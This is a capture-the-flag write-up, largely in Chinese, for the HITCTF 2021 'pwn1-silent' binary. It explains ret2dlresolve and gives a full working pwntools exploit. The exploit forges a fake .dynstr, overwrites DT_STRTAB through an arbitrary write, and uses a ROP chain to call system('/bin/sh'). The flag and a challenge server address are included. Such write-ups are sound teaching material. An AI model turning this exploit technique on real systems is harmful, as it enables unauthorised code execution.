# ret2dlresolve 2021 hitctf pwn1-silent

> challenge name: pwn1-silent
>
> file: pwn
>
> .i64 with comments provided
>
> writeup writer: hexhex16@outlook.com    https://github.com/hex-16 
>
> thanks yuxc liwl

`_dl_runtime_resolve`的具体过程建议看ctf-wiki Executable ELF 程序连接下的源码阅读部分。

大致过程为：

plt表中，先push一个函数`f`对应的offset，然后jmp到公共plt表（在函数plt表项上面），push `.got.plt`的首地址，然后jmp到`.got.plt`中的一个地址以调用`_dl_runtime_resolve`去查找函数`f`的真实地址并填到got表中，然后再调用`f`

在这题中的过程：

1. 在`bss_buf`构造假的`.dynstr`，把`read`替换为`system`，再存一个`/bin/sh`
2. 把`ELF Dynamic Information`中的`DT_STRTAB`存的`.dynstr`地址改为`bss_buf`的地址，这样调`_dl_runtime_resolve`时使用的`.dynstr`表就是`bss_buf`中存储的
3. 控制程序跳转到`read@plt`后，调`_dl_runtime_resolve`，把`bss_buf`作为`.dynstr`解析`system`符号在`libc`中的地址并填到`read@got`，然后`call read@got`实际调用的就是`system`，在此之前让`rdi`指向`/bin/sh`即可



```assembly
comm_plt    proc near   ; 这一段在.plt上
; __unwind {
               push    cs:p_got_plt ; .got.plt的首地址
               jmp     cs:qword_600B70 ; 跳转过去调用 _dl_runtime_resolve
 comm_plt      endp ; 上面这个就是公共plt表
               align 10h
               push    0 ; 某个函数的 .got.plt 表偏移
               jmp     comm_plt ; 跳转到公共.plt表
               push    1
               jmp     comm_plt
```

> 留一个坑：学习`_dl_runtime_resolve`的详细过程，调试在不同RELRO下的got表状态

# IDA Analysis

1. 向bss区上的一个buf写入32B
2. 读入8B，将这8B转换为int，向这个int表示的地址上写入任意8B，这里存在任意地址写（配合No PIE）
3. 向`stack_buf`写入88B，`stack_buf`在`rbp-0x30`处，存在栈溢出（配合No canary）

```cpp
__int64 __fastcall main(int a1, char **a2, char **a3)
{
  int a_int; // eax
  char stack_buf[32]; // [rsp+0h] [rbp-30h] BYREF
  char nptr[16]; // [rsp+20h] [rbp-10h] BYREF

  setvbuf_ini();
  input_str(32, bss_buf);
  input_str(8, nptr);
  a_int = atoi(nptr);
  input_str(8, (char *)a_int);                  // 任意地址写8B
  input_str(88, stack_buf);                     // 栈溢出
  return 0LL;                                   // 0x40076D
}
```

```cpp
char *__fastcall input_str(int a1, char *buf)
{
  char *result; // rax
  int i; // [rsp+1Ch] [rbp-4h]

  for ( i = 0; i < a1; ++i )
  {
    read(0, &buf[i], 1uLL);
    if ( buf[i] == '\n' )
      break;
  }
  result = &buf[i];
  *result = 0;
  return result;
}
```

```bash
    Arch:     amd64-64-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

- No canary, No PIE, No RELRO

# exp

```python
from pwn import *
context.binary = "./pwn"
context.log_level = "debug"
IP = "47.106.219.36"
PORT = 10000
DEBUG = 1

elf = ELF("./pwn")

if DEBUG:
    p = process("./pwn")  #
    # attention: argv[1] for ./pwn when running with ./ld.so ./pwn
    base = p.libs()[p._cwd + p.argv[0].decode().strip('.')]  # fix bytes str error in py3.9
    print("base:", hex(base), p.libs())

else:
    p = remote(IP, PORT)  # HITCTF2021{Y0u_GOT_r0okie-re2dlresolve}


def ru(x): return p.recvuntil(x)
def se(x): return p.send(x)
def rl(): return p.recvline()
def sl(x): return p.sendline(x)
def rv(x): return p.recv(x)
def sa(a, b): return p.sendafter(a, b)
def sla(a, b): return p.sendlineafter(a, b)
def l64(): return u64(p.recvuntil("\x7f")[-6:].ljust(8, b"\x00"))  # python 3.9 pass


def debug(cmd=""):
    gdb.attach(p, cmd)


def dd():
    if DEBUG:
        cmd = ""
        cmd += "b *%d\n" % (0x4004f6)  # addr of .plt: push 0; jmp sub_4004E0 (dlresolve)
        cmd += "b *%d\n" % (0x40076c)  # leave ret
        cmd += "set $a=%d\n" % (0x600C00)  # bss_buf      0x600b68
        debug(cmd)


dd()
pause()

# === Step-1: 把假的.dynstr存到bss上可控buf中，同时存一个/bin/sh字符串
fake_STRTAB_temp = "\x00libc.so.6\x00stdin\x00puts\x00/bin/sh\x00\n"
fake_STRTAB = "\x00libc.so.6\x00stdin\x00system\x00/bin/sh\x00"  # fake ELF String Table .dynstr
print("fake_STRTAB==>", len(fake_STRTAB), fake_STRTAB) # system所在的地方原本为read
se(fake_STRTAB)  # bss_buf 0x600C00

# === Step-2: 把.dynstr的地址改成bss上可控buf的地址
se("6294032\n")  # 0x600A08+8 # addr of DT_STRTAB(.dynstr) # ori value: 0x400368
se("\x00\x0c\x60\n")  # nptr # 6294528 = 0x600C00 "\x00\x0c\x60\n" addr of bss_buf
# cover addr of .dynstr to controlable bss buf

# === Step-3: ROP: 把/bin/sh地址存到rdi后跳到read@plt，就会调_dl_runtime_resolve解析出system并调用
rbp = 0xdeadbeef
pop_rdi_ret = 0x00000000004007d3
bin_sh = 0x600C00 + 24  # addr of /bin/sh
# payload: pop rdi; ret; addr_bin_sh; .plt_read
payload = b"deadbeef".ljust(0x30, b"a") + p64(rbp) + p64(pop_rdi_ret) + p64(bin_sh) + p64(0x4004f6)
se(payload)
p.interactive()

```

